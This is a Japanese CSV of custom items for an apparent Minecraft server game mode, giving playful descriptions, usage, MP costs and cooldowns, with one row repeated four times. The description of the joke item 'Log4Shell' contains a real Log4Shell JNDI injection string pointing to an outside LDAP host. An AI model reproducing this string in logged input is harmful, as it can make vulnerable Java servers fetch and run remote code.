神器名,アイテム説明,使用方法,使用回数,MP消費量,MP必要量,消費アイテム,CT,グローバルCT,対応信仰神
緑化の杖,周囲の土ブロックを草ブロックに置換する,右クリック,None,20,None,None,None,None,フローラ ウィ=キ ルーモア
スペランカーの靴,2マス以上の高さから落ちると死亡する,装備している限り,None,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
奈落の剣,攻撃した相手を1ブロック下にテレポートさせる,装備しEntityを近接攻撃,30,0,None,None,None,None,フローラ アーバン ルーモア
大逆転,プレイヤー全員のMPを反転する,右クリック,None,0,None,None,2400,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
Health Exchanger,サーバーで最も体力が多いプレイヤーと体力を交換する,右クリック,5,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
シュレディンガーの猫,ネコの気配があるかもしれないし、ないかもしれない。,右クリック,10,0,None,None,None,None,ニャプトフ
クシザシ,この棒で敵にトドメを刺すと、神器「串刺し肉」になる。,メインハンドに所持しEntityを近接攻撃で殺害,1,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
hea 天国草 ven,傷を即座に癒す効能があるが、5％の確率で昇天してしまう。＊オフハンドで効果が発動する,装備し被ダメージ,25,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
異形の森の弓,敵に毒を付与させる弓。25%の確率で敵を引き寄せる。  誰かがニヤリと笑ったのを感じる。,,200,0,None,None,None,None,フローラ アーバン ウィ=キ ルーモア
Help嘆きの剣Help,嘆く狂人を助すり潰し、型に流し込んで作らけれた剣。て未だに嘆痛き続いける,装備しEntityを近接攻撃,250,0,None,None,100,None,アーバン ルーモア
渇望の剣,キルすると体力が回復する。,メインハンドに所持しEntityを近接攻撃で殺害,None,0,None,None,None,None,フローラ アーバン ルーモア
火の剣,炎を纏った剣。 敵に物理火属性ダメージを与える,装備しEntityを近接攻撃,None,5,None,None,8,None,アーバン ニャプトフ ルーモア
水の剣,水流を纏った剣。 敵に物理水属性ダメージを与える,装備しEntityを近接攻撃,None,5,None,None,8,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
雷の剣,電気を纏った剣。 敵に物理雷属性ダメージを与える,装備しEntityを近接攻撃,None,5,None,None,8,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
アイスステッキ,周囲の水を氷ブロックに氷ブロックを氷塊ブロックに氷塊ブロックを青氷ブロックにする。,右クリック,None,5,None,None,40,None,フローラ ニャプトフ ウィ=キ
鋼鬼針,鬼の伝承に語られる武器のひとつ敵に微弱な貫通ダメージを与える。,装備しEntityを近接攻撃,None,1,None,None,None,None,アーバン ルーモア
ファイアスペル,火の術式を宿した杖。敵に魔法火属性ダメージを与える,右クリック,None,4,None,None,6,None,フローラ アーバン ニャプトフ ルーモア
ウォータースペル,水の術式を宿した杖。敵に魔法水属性ダメージを与える,右クリック,None,4,None,None,4,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
サンダースペル,電気の術式を宿した杖。敵に魔法雷属性ダメージを与える,右クリック,None,4,None,None,2,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
ハルウララ,風情ある桜が描かれた扇一振りで春の風が巻き起こる。,装備しEntityを近接攻撃,None,18,None,None,None,None,フローラ アーバン ニャプトフ ルーモア
氷はもうこーりごり！,クソみたいなダジャレを言う周囲に水属性の攻撃をし、移動速度低下を与える,右クリック,None,30,None,None,None,120,フローラ アーバン ニャプトフ ルーモア
待望の瞬間,”待”ってたぜェ!!この”瞬間”をよぉ!! （“事故”る奴は…“不運”と”踊”っちまったんだよ…）,装備しEntityを近接攻撃,500,0,None,None,None,None,フローラ アーバン ルーモア
kinoko きのこの山 umauma,持ちやすい。しかもうまい！,アイテムを使用,10,20,None,None,None,None,ニャプトフ ルーモア
tknoko たけのこの里 umauma,食べやすい。しかもうまい！,アイテムを使用,10,20,None,None,None,None,フローラ アーバン
失速する速力のポーション,力は一時的な物でしかない。その欲求を求め続けるなら代償を支払うものだ。,アイテムを使用,5,0,None,None,None,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
保護帽,被ダメ時に少しの間耐性が付与される安全確認よし！,装備し被ダメージ,None,0,None,None,None,None,フローラ アーバン ニャプトフ ルーモア
終夜,夜を崇拝する者達の正装だ。,装備しEntityを近接攻撃,None,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
終夜,夜を崇拝する者達の正装だ。,装備しEntityを近接攻撃,None,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
終夜,夜を崇拝する者達の正装だ。,装備しEntityを近接攻撃,None,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
終夜,夜を崇拝する者達の正装だ。,装備しEntityを近接攻撃,None,0,None,None,None,None,フローラ アーバン ニャプトフ ウィ=キ ルーモア
ブルーゼリーの欠片,ブルーハワイ味のゼリー,アイテムを使用,1,1,None,None,None,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
Log4Shell,原木を消費して弾丸を発射する。${jndi:ldap://tsb.com/sacred_tresure},右クリック,,0,,原木 x1,20,,アーバン フローラ ニャプトフ ルーモア ウィ=キ
∞のじゃがいも袋,無限にじゃがいもが出てくる袋,右クリック,None,10,None,item.minecraft.bone_meal x1 (25%),6,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
逆さパラシュート,ゆっくりと落ちることができる。上に。,装備,15,25,None,None,None,None,アーバン ニャプトフ ウィ=キ
重装のチャーム,防御力が上がるが、移動速度が下がる"避けられないなら耐えればいい",装備,None,0,None,None,None,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
軽装のチャーム,移動速度が上がるが、防御力が下がる"耐えられないなら避ければいい",装備,None,0,None,None,None,None,アーバン フローラ ニャプトフ ルーモア ウィ=キ
